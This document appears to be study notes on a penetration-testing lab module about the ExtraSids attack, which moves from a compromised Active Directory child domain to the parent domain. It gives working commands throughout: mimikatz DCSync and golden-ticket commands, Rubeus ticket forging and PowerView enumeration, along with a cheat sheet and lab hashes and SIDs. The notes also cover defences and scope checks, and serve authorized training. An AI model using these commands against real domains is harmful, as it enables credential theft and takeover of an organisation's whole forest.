![Image](https://images.openai.com/static-rsc-4/fc8vxIk3PpJ9JsUnivZXSFaZMeGL_bBbdqcKKU_qgMidXsZpGfsALoTrTzZCU1lnPID9Lm1GlJJ0_WwTd3YEww3yLZS0lkblXUBlQTxPqtOfrzABxD8YPHB9I6okv9dyt6khwBcAbxmDHJrIzbA-tehXIi3SNOI21It9fe8toLPaDOYnEcNY7vBSVfLXZ9iQ?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/AZAU1Wp0-co3X5OGtU1VQ5NRnzb-4nG4RUhrnautWJ-dnQxzeq2jaKRcD3B4pS0mz3jybpUORWLJ3GDhpjBwp-vsSyU8JWI8_kA18d2owSjeG-2ylz0HTzRMmIcrEBnJNkZhuliV3f9E9w-TOgv7MkMJna2arhS_3Tt35IDHL8y74JlpfsXJ0192MHzkKHR1?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/NAmNzoZoCn6clIRgRTUrmU51wY7nZPOfy6bimMAeELaO3X3EPAV5c-q8lYXd0MVPTfflbZABPv8WiJUfmxYu-C5s6kD7Rvf2CW4HwYsMcO6F58fNhYxy32ce_sW6JcWOa2nm5DFRGGXbZNqk-WfRjTQwUqKqWntNJQrj3yMwR7RI06QMtcsE5jrF-45rCgsY?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/j2YzhZOz3DToxnnjiDN1MPFH1vp9RJW37Fq5lft-bB8xCGMm_o1tKKnW3k7p8OyRNsaSkFn1up2qCF9B2k74QBUbDaflnCRXEBIBD-UPecOGhd1gVa9cI3OGIqaH_uoZfSmay1bkZQYs5bgZnO0EocqABf2bM4OL_Zr1sTpagGPLqlwy66k0d0KKghSrhsC2?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/v_CKnfcsC3swyjS474RLKYh1r-nsDpTz4pWkRRgL2WsjKQ4i7lwd0JrUs81-iz-Z9jAFvIT95RgKS19FXou5xHCB2XNDtP7h86dZChU2e9m7fwCsHsr4xqmu7dDgAUOITVDuSl7mpG8i-ESMeni_dK88Jqexbc8n5a0ftbd4266pDXuyEgX3azmO0hZptCAV?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/orGrsWO6KHm4QI5Xp0JF-aCEQ-euBnVS_qkJi1Jq0lV5dOslD06IWtWHhVnvMmjAxQzRPIKoWByj_cbos03yLZ7Iest6mi9q8VIkPGTdyAu0bDnS3VdEZPaInMJFe2J2wsAjXrCC_JCZSzoM6Xgh_Wv6SzJB_tHTO0k4q3OzQFuUWqio4o-hS6mQ-hvsO26Z?purpose=fullsize)
## 1. Module Overview

This module focuses on attacking a **child → parent domain trust** after the child domain has already been compromised.

The central technique is the:

```text
ExtraSids Attack
```

The attack abuses:

```text
SIDHistory
+
Kerberos
+
KRBTGT hash
+
Enterprise Admins SID
```

to create a Kerberos ticket from the compromised child domain that contains the SID of the parent domain's **Enterprise Admins** group.

The result is that the forged identity can be treated as having Enterprise Admin privileges in the parent domain.

The module specifically describes this as a way to compromise the parent domain after compromising the child domain.

---

# 2. Prerequisite: Understand Parent-Child Trusts

Before studying the attack, remember what we learned in the Domain Trusts Primer.

A parent-child trust exists between domains in the same forest.

Example:

```text
              INLANEFREIGHT.LOCAL
                       │
                 Parent Domain
                       │
                 Trust Relationship
                       │
                       ▼
          LOGISTICS.INLANEFREIGHT.LOCAL
                  Child Domain
```

The child domain has a:

```text
Two-way
Transitive
Trust
```

with the parent domain.

Therefore:

```text
Child
  ↕
Parent
```

This relationship is important because authentication information can cross the domain boundary.

---

# 3. Why Child → Parent Attacks Matter

A common mistake during an AD assessment is to treat the child domain as isolated.

For example:

```text
INLANEFREIGHT.LOCAL
        │
        │ Trust
        ▼
LOGISTICS.INLANEFREIGHT.LOCAL
```

An attacker might initially compromise:

```text
LOGISTICS.INLANEFREIGHT.LOCAL
```

and assume that they have only compromised the child.

However, because the child belongs to the same forest and the trust relationship exists, the attacker may be able to leverage the trust to attack:

```text
INLANEFREIGHT.LOCAL
```

the parent/root domain.

---

# 4. SID History Primer

The key concept behind this attack is:

```text
sidHistory
```

The `sidHistory` attribute exists primarily to support **domain migrations**.

Suppose a user moves from:

```text
OLD-DOMAIN
```

to:

```text
NEW-DOMAIN
```

A new account is created in the new domain.

The user's old SID can be stored in:

```text
sidHistory
```

This allows the migrated account to continue accessing resources associated with the old SID.

### Concept

```text
OLD ACCOUNT
SID:
S-1-5-21-OLD-1001
        │
        │ Migration
        ▼
NEW ACCOUNT
Current SID:
S-1-5-21-NEW-1001

SIDHistory:
S-1-5-21-OLD-1001
```

When the account authenticates, the SIDs associated with the account are included in the user's security token.

---

# 5. Why SID History Is Powerful

Windows uses security identifiers (SIDs) to determine what resources an account can access.

A simplified flow:

```text
User logs in
     │
     ▼
Security Token Created
     │
     ├── Current SID
     ├── Group SIDs
     └── SIDHistory SIDs
             │
             ▼
      Access Decisions
```

Therefore, if an inappropriate privileged SID appears in the token, Windows may treat the account as belonging to that privileged group.

The module explains that injecting an administrator SID into SIDHistory can cause the corresponding privileges to appear in the user's token.

---

# 6. SID History Injection

An attacker who can manipulate SIDHistory can potentially add a privileged SID to an account they control.

Conceptually:

```text
Normal Account

User SID
   +
Normal Groups
```

becomes:

```text
Compromised Account

User SID
   +
Normal Groups
   +
Privileged SID
```

When the account logs in:

```text
Security Token
       │
       ├── User SID
       ├── Normal Groups
       └── Privileged SID
                    │
                    ▼
             Privileged Access
```

This is the fundamental idea behind the attack.

---

# 7. ExtraSids Attack

The specific child → parent technique is known as:

```text
ExtraSids Attack
```

The module explains that this attack can allow compromise of the parent domain once the child domain has been compromised.

The important condition is that the child and parent are within the **same AD forest**, where SIDHistory is respected because the normal SID Filtering protection used across forest boundaries does not provide the same barrier.

---

# 8. Why Enterprise Admins?

The target group is:

```text
Enterprise Admins
```

This group exists in the forest root/parent domain.

Its SID can be used as an additional SID in the forged ticket.

The conceptual attack is:

```text
Compromised Child Domain
          │
          ▼
Child KRBTGT Hash
          │
          ▼
Forge Kerberos TGT
          │
          +
          │
Enterprise Admins SID
          │
          ▼
Ticket accepted in Parent
          │
          ▼
Enterprise-level access
```

The module explains that adding the Enterprise Admins SID can cause the account to be treated as a member of that group.

---

# 9. SID Filtering

## What is SID Filtering?

SID Filtering is a security mechanism intended to prevent unauthorized SID information from being accepted across certain trust boundaries.

It is especially relevant to trusts involving different forests.

Conceptually:

```text
Domain A
   │
   │ SID
   ▼
SID Filtering
   │
   ├── Valid SID
   │      ↓
   │    Accept
   │
   └── Unauthorized SID
          ↓
        Filter
```

The module describes SID Filtering as protection designed to filter authentication requests containing inappropriate SID information from another forest.

---

# 10. Why SID Filtering Matters Here

The child and parent domains are in:

```text
THE SAME FOREST
```

Therefore, the SIDHistory behavior relevant to this attack is not blocked in the same way it would be across a forest trust protected by SID filtering.

This creates the attack path:

```text
Child Domain
     │
     │ Same Forest
     ▼
Parent Domain
     │
     │ Enterprise Admin SID
     ▼
Enterprise-Level Access
```

---

# 11. Attack Requirements

This is one of the most important sections to memorize.

To perform the ExtraSids attack after compromising the child domain, the module says we need:

### 1. KRBTGT hash

The NT hash of:

```text
KRBTGT
```

from the **child domain**.

### 2. Child domain SID

Example:

```text
S-1-5-21-2806153819-209893948-922872689
```

### 3. Target username

A username to put into the forged ticket.

The module notes that the user **does not need to actually exist**.

Example:

```text
hacker
```

### 4. Child domain FQDN

Example:

```text
LOGISTICS.INLANEFREIGHT.LOCAL
```

### 5. Enterprise Admins SID

The SID of:

```text
Enterprise Admins
```

from the parent/root domain.

These five pieces of information are explicitly listed in the module.

---

# 12. Attack Data Checklist

Memorize this:

```text
┌──────────────────────────────────────┐
│       ExtraSids Requirements         │
├──────────────────────────────────────┤
│ Child KRBTGT NT Hash                 │
│ Child Domain SID                     │
│ Target Username                      │
│ Child Domain FQDN                    │
│ Parent Enterprise Admins SID         │
└──────────────────────────────────────┘
```

Without these values, the specific attack cannot be constructed as demonstrated in the module.

---

# 13. Understanding KRBTGT

`KRBTGT` is a special Active Directory account associated with the Kerberos Key Distribution Center (KDC).

Its secret is used to:

```text
Encrypt / sign Kerberos TGTs
```

Domain controllers use the KRBTGT secret to validate Kerberos tickets.

The module explains that possession of the KRBTGT hash allows an attacker to create TGTs that can be used to request service tickets.

---

# 14. Golden Ticket Concept

A:

```text
Golden Ticket
```

is a forged Kerberos:

```text
Ticket Granting Ticket (TGT)
```

created using the KRBTGT secret.

Simplified:

```text
KRBTGT Hash
     │
     ▼
Forge TGT
     │
     ▼
Kerberos Authentication
     │
     ▼
Request Service Tickets
```

The module describes Golden Tickets as a well-known Active Directory persistence technique.

---

# 15. Important KRBTGT Security Fact

A Golden Ticket can remain valid until the relevant KRBTGT password changes.

The module notes that changing the KRBTGT password is the mechanism used to invalidate existing Golden Tickets and recommends doing so periodically and after a full-domain compromise during an assessment.

### Remember

```text
KRBTGT password changed
        ↓
Old Golden Tickets invalidated
```

---

# 16. Obtaining the Child KRBTGT Hash

Once the child domain has been compromised with sufficient privileges, the module uses:

```text
DCSync
```

to obtain the child domain's KRBTGT NT hash.

Example from the module:

```powershell
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```

The output identifies:

```text
Domain:
LOGISTICS.INLANEFREIGHT.LOCAL

User:
LOGISTICS\krbtgt
```

and returns the NTLM hash.

---

# 17. What Is DCSync?

DCSync is a technique that abuses Active Directory replication functionality.

Conceptually:

```text
Attacker
   │
   │ Replication request
   ▼
Domain Controller
   │
   ▼
Directory secrets
```

With sufficient directory replication privileges, an attacker can request credential material for accounts such as:

```text
KRBTGT
```

This is why DCSync is generally associated with **high-privilege domain compromise**.

---

# 18. Example KRBTGT Output

The module provides:

```text
SAM Username         : krbtgt
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
```

The important field for the Golden Ticket construction is:

```text
Hash NTLM
```

---

# 19. Obtaining the Child Domain SID

PowerView can be used:

```powershell
Get-DomainSID
```

Example output:

```text
S-1-5-21-2806153819-209893948-922872689
```

Notice that the domain SID is the portion before the user's RID.

Example:

```text
Domain SID:
S-1-5-21-2806153819-209893948-922872689

KRBTGT SID:
S-1-5-21-2806153819-209893948-922872689-502
                                             └─ RID
```

---

# 20. Obtaining the Parent Enterprise Admins SID

PowerView:

```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" |
select distinguishedname,objectsid
```

The module returns:

```text
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL

S-1-5-21-3842939050-3880317879-2865463114-519
```

The final number:

```text
519
```

is the RID associated with:

```text
Enterprise Admins
```

---

# 21. Alternative: Get-ADGroup

The module also notes that the Enterprise Admins SID can be obtained with:

```powershell
Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
```

---

# 22. Complete Attack Data

At this point the module has:

```text
Child KRBTGT hash:
9d765b482771505cbe97411065964d5f

Child domain SID:
S-1-5-21-2806153819-209893948-922872689

Target user:
hacker

Child domain:
LOGISTICS.INLANEFREIGHT.LOCAL

Parent Enterprise Admins SID:
S-1-5-21-3842939050-3880317879-2865463114-519
```

These are the exact data points demonstrated in the module.

---

# 23. Before the Attack

The module first verifies that the compromised child-domain identity does **not** have access to the parent DC's administrative file share.

Example:

```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$
```

Result:

```text
Access is denied
```

This gives us a useful baseline:

```text
Before forged ticket:
Parent DC C$ → Access Denied
```

---

# 24. ExtraSids + Golden Ticket

Now the gathered information can be used to construct a Golden Ticket.

The important concept is:

```text
Child KRBTGT
      +
Child Domain SID
      +
Enterprise Admins SID
      ↓
Forged TGT
      ↓
Parent-domain privileged access
```

---

# 25. Mimikatz Golden Ticket

The module demonstrates:

```powershell
mimikatz.exe
```

followed by:

```text
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

### Important flags

```text
/user:
```

Username placed into the ticket.

```text
/domain:
```

Child domain FQDN.

```text
/sid:
```

Child domain SID.

```text
/krbtgt:
```

Child domain KRBTGT NT hash.

```text
/sids:
```

Additional SID, in this case the parent Enterprise Admins SID.

```text
/ptt
```

Passes the generated ticket into the current logon session.

---

# 26. Understanding `/sids`

This is the most important option for the ExtraSids attack.

Normally a ticket might contain:

```text
Child User
   ↓
Child Groups
```

With:

```text
/sids:<Enterprise Admins SID>
```

the forged ticket contains an additional SID:

```text
Child User
   │
   ├── Child Groups
   │
   └── Enterprise Admins SID
```

The module's output shows:

```text
Extra SIDs:
S-1-5-21-3842939050-3880317879-2865463114-519
```

---

# 27. What Does `/ptt` Mean?

`/ptt` means:

```text
Pass The Ticket
```

Instead of simply generating a ticket file, the ticket is injected into the current session.

Conceptually:

```text
Golden Ticket
      │
      │ /ptt
      ▼
Current Session
      │
      ▼
Kerberos Authentication
```

The module reports:

```text
-> Ticket : Pass The Ticket
```

after creating the ticket.

---

# 28. Confirming the Ticket

After injection, use:

```powershell
klist
```

The module shows:

```text
Client:
hacker @ LOGISTICS.INLANEFREIGHT.LOCAL

Server:
krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL
```

This confirms that the forged Kerberos TGT is present in memory.

---

# 29. Ticket Flow

Visualize the complete process:

```text
┌──────────────────────────────┐
│ Compromised Child Domain     │
│ LOGISTICS.INLANEFREIGHT.LOCAL│
└──────────────┬───────────────┘
               │
               │ Obtain
               ▼
        Child KRBTGT Hash
               │
               +
               │
        Child Domain SID
               │
               +
               │
     Parent Enterprise Admins
              SID
               │
               ▼
       Forge Golden Ticket
               │
               ▼
             /ptt
               │
               ▼
        Ticket in Memory
               │
               ▼
        Parent Domain Access
```

---

# 30. Accessing the Parent DC

After the ticket is successfully injected, the module demonstrates access to the parent DC's filesystem.

Previously:

```text
Access is denied
```

After the forged ticket:

```text
C:\ drive accessible
```

The module shows the contents of:

```text
\\academy-ea-dc01.inlanefreight.local\c$
```

including:

```text
PerfLogs
Program Files
Program Files (x86)
Shares
Users
Windows
```

---

# 31. Why This Works

The important chain is:

```text
Child Domain
     │
     │ Same Forest
     ▼
Parent Domain
     │
     │ SIDHistory / Extra SID
     ▼
Enterprise Admin SID
     │
     ▼
Security Token
     │
     ▼
Parent Administrative Access
```

The parent domain trusts the child as part of the forest trust structure, and the forged ticket carries the privileged SID.

---

# 32. Rubeus Alternative

The module also demonstrates that the same attack can be performed with:

```text
Rubeus
```

The relevant command structure is:

```powershell
.\Rubeus.exe golden /rc4:<CHILD_KRBTGT_HASH> /domain:<CHILD_DOMAIN> /sid:<CHILD_DOMAIN_SID> /sids:<PARENT_ENTERPRISE_ADMINS_SID> /user:hacker /ptt
```

The module's exact example is:

```powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

---

# 33. Rubeus Important Flags

```text
/rc4:
```

The NT hash of the child KRBTGT account.

```text
/domain:
```

Child domain.

```text
/sid:
```

Child domain SID.

```text
/sids:
```

Parent Enterprise Admins SID.

```text
/user:
```

Username to place into the forged ticket.

```text
/ptt
```

Pass the ticket into the current session.

---

# 34. Mimikatz vs Rubeus

|Mimikatz|Rubeus|
|---|---|
|`kerberos::golden`|`golden`|
|`/krbtgt:`|`/rc4:`|
|`/domain:`|`/domain:`|
|`/sid:`|`/sid:`|
|`/sids:`|`/sids:`|
|`/user:`|`/user:`|
|`/ptt`|`/ptt`|

### Core idea

Both tools are performing the same conceptual operation:

```text
Child KRBTGT
+
Child SID
+
Parent Enterprise Admin SID
=
Golden Ticket with Extra SID
```

---

# 35. Important Difference: `/krbtgt` vs `/rc4`

For Mimikatz:

```text
/krbtgt:<NT HASH>
```

For Rubeus:

```text
/rc4:<NT HASH>
```

They refer to the same underlying credential material in this RC4-based Golden Ticket example.

---

# 36. After Parent-Domain Access

Once the forged ticket provides parent-domain administrative access, several further actions could potentially be performed.

The module demonstrates that the attacker can proceed to compromise the parent domain, including obtaining credential material through techniques such as DCSync.

For example, the module demonstrates:

```powershell
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

which returns credential information for `lab_adm`.

The important learning point is:

```text
Child Domain Compromise
        ↓
ExtraSids
        ↓
Parent Domain Administrative Access
        ↓
Potential Full Forest Compromise
```

---

# 37. Full Attack Chain

Memorize this flow:

```text
1. Compromise Child Domain
          ↓
2. Obtain High Privileges
          ↓
3. DCSync Child KRBTGT
          ↓
4. Obtain Child Domain SID
          ↓
5. Obtain Parent Enterprise Admins SID
          ↓
6. Create Golden Ticket
          ↓
7. Add Enterprise Admin SID
          ↓
8. Pass Ticket
          ↓
9. Authenticate to Parent
          ↓
10. Parent Domain Compromise
```

---

# 38. Information-Gathering Commands

### Child domain SID

```powershell
Get-DomainSID
```

### Enterprise Admins SID

```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" |
select distinguishedname,objectsid
```

### Alternative

```powershell
Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
```

### Child KRBTGT

```text
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```

These commands are directly demonstrated in the module.

---

# 39. Important Commands Cheat Sheet

## Get Child SID

```powershell
Get-DomainSID
```

## Get Enterprise Admins SID

```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" |
select distinguishedname,objectsid
```

## DCSync KRBTGT

```text
lsadump::dcsync /user:LOGISTICS\krbtgt
```

## Mimikatz Golden Ticket

```text
kerberos::golden /user:hacker /domain:<CHILD_DOMAIN> /sid:<CHILD_SID> /krbtgt:<KRBTGT_HASH> /sids:<ENTERPRISE_ADMINS_SID> /ptt
```

## Rubeus Golden Ticket

```powershell
.\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:<CHILD_DOMAIN> /sid:<CHILD_SID> /sids:<ENTERPRISE_ADMINS_SID> /user:hacker /ptt
```

## Check Kerberos tickets

```powershell
klist
```

## Test parent DC access

```powershell
ls \\<PARENT-DC>\c$
```

---

# 40. Example Values from the Module

Keep these values for understanding the lab example:

```text
Child Domain:
LOGISTICS.INLANEFREIGHT.LOCAL

Child Domain SID:
S-1-5-21-2806153819-209893948-922872689

Child KRBTGT Hash:
9d765b482771505cbe97411065964d5f

Parent Domain:
INLANEFREIGHT.LOCAL

Enterprise Admins SID:
S-1-5-21-3842939050-3880317879-2865463114-519

Forged User:
hacker
```

These are the exact example values presented by the module.

---

# 41. What Each SID Represents

### Child Domain SID

```text
S-1-5-21-2806153819-209893948-922872689
```

Identifies the child domain's security authority.

### Child KRBTGT SID

```text
S-1-5-21-2806153819-209893948-922872689-502
```

`502` is the RID for KRBTGT.

### Enterprise Admins SID

```text
S-1-5-21-3842939050-3880317879-2865463114-519
```

`519` identifies the Enterprise Admins group.

---

# 42. Why the Fake User Works

The module deliberately uses:

```text
hacker
```

as a username.

The important point is that the forged Kerberos ticket does not require an actual AD user object named `hacker` for the demonstration.

The privileges are derived from the ticket's security information, particularly the added SID.

The module explicitly notes that the target username **does not need to exist**.

---

# 43. Security Token Concept

This is probably the most important Windows concept behind the attack.

Think of a token as:

```text
User
 │
 ├── User SID
 │
 ├── Group SID 1
 │
 ├── Group SID 2
 │
 ├── Group SID 3
 │
 └── SIDHistory / Extra SID
```

Windows uses this information when making access-control decisions.

Therefore:

```text
Extra privileged SID
        ↓
Appears in token
        ↓
Access checks see privileged membership
        ↓
Privileged resources become accessible
```

---

# 44. Golden Ticket vs ExtraSids

Don't confuse these terms.

### Golden Ticket

The general technique of forging a Kerberos TGT using the KRBTGT secret.

### ExtraSids

The technique of adding an additional privileged SID to the forged ticket.

### Child → Parent attack

The scenario where the ExtraSids technique is used to move from a compromised child domain toward the parent domain.

So:

```text
Golden Ticket
      +
ExtraSids
      +
Child → Parent Trust
      =
Child → Parent Domain Compromise
```

---

# 45. Important Defensive Concepts

From a defensive perspective, organizations should pay attention to:

```text
Trust configuration
SIDHistory
KRBTGT security
DCSync privileges
Enterprise Admin membership
Domain trust boundaries
```

Especially important:

```text
Who has replication privileges?
Who can obtain KRBTGT secrets?
What trusts exist?
Are trusts necessary?
Are privileged accounts exposed in child domains?
```

---

# 46. Assessment / Rules of Engagement

Trust attacks can cross administrative boundaries.

Therefore, the module emphasizes checking whether the discovered trust is actually within the engagement scope.

Before attacking another domain:

```text
Check Rules of Engagement
        ↓
Confirm target is in scope
        ↓
Proceed with authorized testing
```

The module specifically warns that child → parent and bidirectional forest-trust attacks should be confirmed as in scope before proceeding.

---

# 47. Quick Comparison

|Concept|Meaning|
|---|---|
|SID|Security Identifier|
|SIDHistory|Stores previous/extra SIDs associated with an account|
|SID Filtering|Helps prevent unauthorized SID information crossing certain trust boundaries|
|KRBTGT|Kerberos TGT-signing account|
|DCSync|Abuses directory replication to retrieve credential material|
|Golden Ticket|Forged Kerberos TGT|
|ExtraSids|Adds an additional SID to the forged ticket|
|Enterprise Admins|Highly privileged forest-level group|
|`/ptt`|Pass Ticket into current session|
|`klist`|Displays Kerberos tickets in the current session|

---

# 48. Exam / HTB Memory Section

### What is the attack called?

```text
ExtraSids Attack
```

### What must already be compromised?

```text
Child Domain
```

### What hash is required?

```text
Child Domain KRBTGT NT Hash
```

### What SID is required from the parent?

```text
Enterprise Admins SID
```

### What PowerView command obtains the child SID?

```powershell
Get-DomainSID
```

### What PowerView command obtains Enterprise Admins SID?

```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" |
select distinguishedname,objectsid
```

### What Mimikatz command obtains KRBTGT?

```text
lsadump::dcsync /user:LOGISTICS\krbtgt
```

### What Mimikatz command creates the Golden Ticket?

```text
kerberos::golden
```

### What flag adds the parent Enterprise Admin SID?

```text
/sids:
```

### What flag injects the ticket?

```text
/ptt
```

### What command checks the ticket?

```powershell
klist
```

---

# 49. One-Page Revision Sheet

```text
          CHILD → PARENT TRUST ATTACK
                     │
                     ▼
          Compromise Child Domain
                     │
                     ▼
             Obtain KRBTGT Hash
                     │
                     ▼
             Obtain Child SID
                     │
                     ▼
       Obtain Enterprise Admins SID
                     │
                     ▼
            Forge Golden Ticket
                     │
                     │
              /sids:<EA SID>
                     │
                     ▼
                  /ptt
                     │
                     ▼
             Ticket in Memory
                     │
                     ▼
             Authenticate to
             Parent Domain
                     │
                     ▼
          Parent Domain Access
```

### Five things to memorize

```text
1. Child KRBTGT hash
2. Child domain SID
3. Child domain FQDN
4. Target username
5. Parent Enterprise Admins SID
```

### Three commands to remember

```powershell
Get-DomainSID
```

```text
lsadump::dcsync /user:LOGISTICS\krbtgt
```

```text
kerberos::golden ... /sids:<Enterprise_Admins_SID> /ptt
```

### Two verification commands

```powershell
klist
```

```powershell
ls \\<PARENT-DC>\c$
```

---

# 50. Final Mental Model

The entire module can be reduced to one idea:

> **If you compromise a child domain inside an AD forest and obtain the child KRBTGT secret, the child → parent trust can potentially be abused by forging a Kerberos ticket containing the parent Enterprise Admins SID.**

Visualize it as:

```text
        INLANEFREIGHT.LOCAL
          PARENT / ROOT
                ▲
                │
      Enterprise Admins SID
                │
                │
          TRUST BOUNDARY
                │
                ▼
       LOGISTICS.INLANEFREIGHT.LOCAL
              CHILD
                │
                │
        KRBTGT HASH obtained
                │
                ▼
        Golden Ticket forged
                │
                ▼
             ExtraSids
                │
                ▼
          /ptt → klist
                │
                ▼
        Parent authentication
```

**Core takeaway:**

```text
Compromised Child
       +
Child KRBTGT
       +
Parent Enterprise Admin SID
       ↓
ExtraSids Golden Ticket
       ↓
Potential Parent Domain Compromise
```

This is why **domain trust enumeration is not merely informational**. A trust relationship can create a security boundary that must be assessed carefully during an authorized AD penetration test.